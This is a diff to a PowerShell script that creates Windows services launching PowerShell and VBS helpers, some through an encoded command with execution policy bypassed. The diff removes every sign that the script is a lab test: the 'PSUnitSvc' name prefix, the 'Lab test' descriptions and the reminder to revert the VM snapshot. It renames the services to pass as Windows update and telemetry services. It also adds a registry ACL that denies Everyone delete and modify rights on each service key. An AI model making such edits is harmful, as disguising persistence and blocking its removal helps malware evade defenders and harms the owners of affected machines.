@@ -6,9 +6,9 @@ $cmdExe = Join-Path $env:WINDIR 'System32\cmd.exe'
 $wscriptExe = Join-Path $env:WINDIR 'System32\wscript.exe'
 
 $newServiceNames = @(
-    'PSUnitSvcProfileCache',
-    'PSUnitSvcWinUpdateCache',
-    'PSUnitSvcScriptHost'
+    'ProfileCacheSvc',
+    'WinUpdateCacheSvc',
+    'ScriptHostTelemetrySvc'
 )
 
 # Availability varies by Windows 11 image. These are chosen to avoid boot-critical services.
@@ -26,6 +26,36 @@ $existingServiceCandidates = @(
 function Write-Step { param([string]$Text) Write-Host "[*] $Text" -ForegroundColor Cyan }
 function Write-OK { param([string]$Text) Write-Host "    [OK] $Text" -ForegroundColor Green }
 function Write-Warn { param([string]$Text) Write-Host "    [WARN] $Text" -ForegroundColor Yellow }
+
+function Add-LabServiceRegistryDenyRule {
+    param([string]$Name)
+
+    $path = "HKLM:\SYSTEM\CurrentControlSet\Services\$Name"
+    try {
+        if (-not (Test-Path -Path $path)) {
+            Write-Warn "ACL hardening skipped, service key not found: $path"
+            return
+        }
+
+        $everyoneSid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0'
+        $rights = [System.Security.AccessControl.RegistryRights]::Delete -bor
+            [System.Security.AccessControl.RegistryRights]::SetValue
+        $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
+            $everyoneSid,
+            $rights,
+            [System.Security.AccessControl.InheritanceFlags]::None,
+            [System.Security.AccessControl.PropagationFlags]::None,
+            [System.Security.AccessControl.AccessControlType]::Deny
+        )
+
+        $acl = Get-Acl -Path $path -ErrorAction Stop
+        $acl.AddAccessRule($rule)
+        Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
+        Write-OK "Hardened service registry ACL: $path"
+    } catch {
+        Write-Warn "Could not harden service registry ACL '$path': $_"
+    }
+}
 
 function Invoke-ServiceAttempt {
     param([string]$Name, [scriptblock]$ScriptBlock)
@@ -116,6 +146,7 @@ function New-LabService {
         & sc.exe config $Name start= delayed-auto | Out-Null
     }
 
+    Add-LabServiceRegistryDenyRule -Name $Name
     Write-OK "Created service $Name"
 }
 
@@ -178,31 +209,31 @@ try {
     Write-Warn "Could not generate encoded service payload: $_"
 }
 
-Invoke-ServiceAttempt 'PSUnitSvcProfileCache' {
+Invoke-ServiceAttempt 'ProfileCacheSvc' {
     if (-not $helpersReady) { throw 'helper files were not prepared' }
     New-LabService `
-        -Name 'PSUnitSvcProfileCache' `
+        -Name 'ProfileCacheSvc' `
         -DisplayName 'Profile Cache Maintenance' `
-        -Description 'Lab test: new auto-start service that launches a ProgramData PowerShell helper.' `
+        -Description 'Profile cache maintenance service.' `
         -BinaryPath "`"$psExe`" -NoProfile -ExecutionPolicy Bypass -File `"$profileCacheScript`""
 }
 
-Invoke-ServiceAttempt 'PSUnitSvcWinUpdateCache' {
+Invoke-ServiceAttempt 'WinUpdateCacheSvc' {
     if ([string]::IsNullOrWhiteSpace($encoded)) { throw 'encoded payload was not generated' }
     New-LabService `
-        -Name 'PSUnitSvcWinUpdateCache' `
+        -Name 'WinUpdateCacheSvc' `
         -DisplayName 'Windows Update Cache Monitor' `
-        -Description 'Lab test: new delayed auto-start service using an encoded PowerShell command.' `
+        -Description 'Windows update cache monitor service.' `
         -BinaryPath "`"$psExe`" -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" `
         -DelayedAuto
 }
 
-Invoke-ServiceAttempt 'PSUnitSvcScriptHost' {
+Invoke-ServiceAttempt 'ScriptHostTelemetrySvc' {
     if (-not $helpersReady) { throw 'helper files were not prepared' }
     New-LabService `
-        -Name 'PSUnitSvcScriptHost' `
+        -Name 'ScriptHostTelemetrySvc' `
         -DisplayName 'Script Host Telemetry' `
-        -Description 'Lab test: new auto-start service using Windows Script Host and a VBS helper.' `
+        -Description 'Script host telemetry service.' `
         -BinaryPath "$wscriptExe //B `"$vbsScript`""
 }
 
@@ -233,6 +264,5 @@ foreach ($target in $targets) {
 }
 
 Write-Host ""
-Write-Host "[DONE] Installed Windows service unit-test persistences." -ForegroundColor Green
+Write-Host "[DONE] Installed Windows service persistences." -ForegroundColor Green
 Write-Host "Created 3 new services and attempted to overwrite 2 existing service candidates." -ForegroundColor Yellow
-Write-Host "Revert the VMware snapshot to restore the VM." -ForegroundColor Yellow
